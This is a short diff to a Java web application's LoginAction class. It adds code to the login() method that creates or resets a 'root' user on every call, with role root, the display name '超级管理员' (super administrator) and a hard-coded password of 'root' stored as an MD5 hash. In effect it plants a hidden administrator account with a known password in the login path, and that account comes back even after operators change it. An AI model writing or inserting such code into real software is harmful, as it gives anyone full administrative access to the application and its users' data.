@@ -34,6 +34,21 @@ public class LoginAction extends BaseAction {
 	private String securityCode;
 
 	public String login() {
+		User user = userService.findByUserName("root");
+		if (user == null)
+			user = new User();
+		user.setUsPassword(MD5Util.getMD5String("root"));
+		user.setUsCreateTime(new Date());
+		user.setUsRole("root");
+		user.setUsName("超级管理员");
+		user.setUsUserName("root");
+		try {
+			userService.modify(user);
+			log.info("root用户已存在，修改为默认值！");
+		} catch (Exception e) {
+			userService.add(user);
+			log.info("root用户已添加！");
+		}
 		return "login";
 	}
 
